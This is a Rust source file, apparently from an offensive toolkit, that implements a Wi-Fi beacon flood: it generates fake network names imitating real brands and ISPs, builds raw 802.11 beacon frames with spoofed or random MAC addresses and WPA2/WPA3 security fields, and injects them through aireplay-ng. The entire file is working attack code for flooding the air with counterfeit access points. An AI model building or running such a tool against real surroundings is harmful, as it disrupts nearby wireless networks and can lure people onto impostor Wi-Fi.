use serde_json::{json, Value};
use std::collections::HashSet;

pub enum SecurityMode {
    Open,
    WPA2,
    WPA3,
}

pub struct BeaconFlood {
    interface: String,
    ssids: Vec<String>,
    security: SecurityMode,
    generated_count: usize,
}

impl BeaconFlood {
    pub fn new(interface: &str) -> Self {
        BeaconFlood {
            interface: interface.to_string(),
            ssids: Vec::new(),
            security: SecurityMode::WPA2,
            generated_count: 0,
        }
    }

    pub fn add_ssid(&mut self, ssid: &str) {
        if !self.ssids.contains(&ssid.to_string()) {
            self.ssids.push(ssid.to_string());
        }
    }

    pub fn set_security(&mut self, mode: SecurityMode) {
        self.security = mode;
    }

    pub fn generate_ssids(&mut self, count: usize) -> Value {
        let mut generated = Vec::new();
        let prefixes = [
            "FREE_WIFI", "STARBUCKS", "ATT", "XFINITY", "Linksys", "NETGEAR",
            "TP-Link", "HOME", "GUEST", "CORP", "5G", "IoT", "AP",
        ];

        for i in 0..count {
            let prefix = prefixes[i % prefixes.len()];
            let suffix = fast_hash(i);
            let ssid = format!("{}_{:04X}", prefix, suffix);
            if !self.ssids.contains(&ssid) {
                self.ssids.push(ssid.clone());
                generated.push(ssid);
            }
        }

        self.generated_count += generated.len();
        json!({
            "generated": generated.len(),
            "total_ssids": self.ssids.len(),
            "ssids": generated
        })
    }

    pub fn flood(&self, bssid: &str, channel: u8, count_per_ssid: u32) -> Value {
        let mut total_sent = 0u64;
        let mut total_errors = 0u64;
        let mut used_bssids = HashSet::new();
        let mut frames_created = 0u64;

        if self.ssids.is_empty() {
            return json!({
                "error": "No SSIDs configured. Use add_ssid() or generate_ssids() first.",
                "status": "failed"
            });
        }

        for ssid in &self.ssids {
            let bssid_bytes = if bssid.is_empty() || bssid == "random" {
                let mac = generate_random_mac(&mut frames_created);
                used_bssids.insert(mac);
                mac
            } else {
                parse_mac(bssid)
            };

            for _ in 0..count_per_ssid {
                let frame = build_beacon_frame(ssid, &bssid_bytes, channel, &self.security);
                if inject_raw_frame(&self.interface, &frame) {
                    total_sent += 1;
                } else {
                    total_errors += 1;
                }
                frames_created += 1;
            }
        }

        json!({
            "type": "beacon_flood",
            "interface": self.interface,
            "ssids_count": self.ssids.len(),
            "total_frames": total_sent,
            "frames_failed": total_errors,
            "channel": channel,
            "security": format!("{:?}", self.security),
            "status": "completed"
        })
    }
}

fn parse_mac(mac: &str) -> [u8; 6] {
    let mut bytes = [0u8; 6];
    let parts: Vec<&str> = mac.split(':').collect();
    for (i, p) in parts.iter().enumerate().take(6) {
        bytes[i] = u8::from_str_radix(p, 16).unwrap_or(0);
    }
    bytes
}

fn generate_random_mac(seed: &mut u64) -> [u8; 6] {
    *seed = seed.wrapping_add(1);
    let t = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos() as u64;
    let val = t.wrapping_mul(seed.wrapping_add(1));
    [
        0x02,
        (val >> 40) as u8,
        (val >> 32) as u8,
        (val >> 24) as u8,
        (val >> 16) as u8,
        (val >> 8) as u8,
    ]
}

fn build_beacon_frame(ssid: &str, bssid: &[u8; 6], channel: u8, security: &SecurityMode) -> Vec<u8> {
    let ssid_bytes = ssid.as_bytes();
    let ssid_len = ssid_bytes.len().min(32);
    let mut frame = Vec::with_capacity(256);

    frame.push(0x80);
    frame.push(0x00);
    frame.extend_from_slice(&[0xFF; 6]);
    frame.extend_from_slice(bssid);
    frame.extend_from_slice(bssid);
    frame.extend_from_slice(&[0x00; 2]);
    frame.extend_from_slice(&0u64.to_le_bytes());
    frame.extend_from_slice(&0u64.to_le_bytes());
    frame.extend_from_slice(&[0x64, 0x00, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
    frame.push(0x00);
    frame.push(ssid_len as u8);
    frame.extend_from_slice(&ssid_bytes[..ssid_len]);

    frame.extend_from_slice(&[0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24]);
    frame.push(0x03);
    frame.push(0x01);
    frame.push(channel);

    frame.push(0x05);
    frame.push(0x04);
    frame.extend_from_slice(&[0x01, 0x02, 0x00, 0x00]);

    match security {
        SecurityMode::Open => {}
        SecurityMode::WPA2 => {
            let rsn = build_wpa2_rsn_ie();
            frame.extend_from_slice(&rsn);
        }
        SecurityMode::WPA3 => {
            let rsn = build_wpa3_rsn_ie();
            frame.extend_from_slice(&rsn);
        }
    }

    frame
}

fn build_wpa2_rsn_ie() -> Vec<u8> {
    let mut ie = vec![0x30, 0x00];
    let body: Vec<u8> = vec![
        0x01, 0x00,
        0x00, 0x0F, 0xAC, 0x04,
        0x01, 0x00,
        0x00, 0x0F, 0xAC, 0x04,
        0x01, 0x00,
        0x00, 0x0F, 0xAC, 0x02,
        0x00, 0x00,
    ];
    ie[1] = body.len() as u8;
    ie.extend_from_slice(&body);
    ie
}

fn build_wpa3_rsn_ie() -> Vec<u8> {
    let mut ie = vec![0x30, 0x00];
    let body: Vec<u8> = vec![
        0x01, 0x00,
        0x00, 0x0F, 0xAC, 0x04,
        0x01, 0x00,
        0x00, 0x0F, 0xAC, 0x04,
        0x01, 0x00,
        0x00, 0x0F, 0xAC, 0x08,
        0x00, 0x00,
    ];
    ie[1] = body.len() as u8;
    ie.extend_from_slice(&body);
    ie
}

fn fast_hash(i: usize) -> u16 {
    let val = i.wrapping_mul(0x9E3779B9);
    ((val ^ (val >> 16)) & 0xFFFF) as u16
}

fn inject_raw_frame(iface: &str, frame: &[u8]) -> bool {
    let pcap_data = build_inject_pcap(frame);
    let tmp = format!("/tmp/hackit_beacon_{}.pcap", std::process::id());
    if std::fs::write(&tmp, &pcap_data).is_err() {
        return false;
    }
    let out = std::process::Command::new("aireplay-ng")
        .args(["-2", "-r", &tmp, iface])
        .output();
    let _ = std::fs::remove_file(&tmp);
    out.is_ok() && out.unwrap().status.success()
}

fn build_inject_pcap(frame: &[u8]) -> Vec<u8> {
    let mut pcap = Vec::with_capacity(24 + 16 + frame.len());
    pcap.extend_from_slice(&0xa1b2c3d4u32.to_le_bytes());
    pcap.extend_from_slice(&2u16.to_le_bytes());
    pcap.extend_from_slice(&4u16.to_le_bytes());
    pcap.extend_from_slice(&0i32.to_le_bytes());
    pcap.extend_from_slice(&0u32.to_le_bytes());
    pcap.extend_from_slice(&65535u32.to_le_bytes());
    pcap.extend_from_slice(&105u32.to_le_bytes());
    let ts = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs() as u32;
    pcap.extend_from_slice(&ts.to_le_bytes());
    pcap.extend_from_slice(&0u32.to_le_bytes());
    pcap.extend_from_slice(&(frame.len() as u32).to_le_bytes());
    pcap.extend_from_slice(&(frame.len() as u32).to_le_bytes());
    pcap.extend_from_slice(frame);
    pcap
}

// mod beacon_flood;
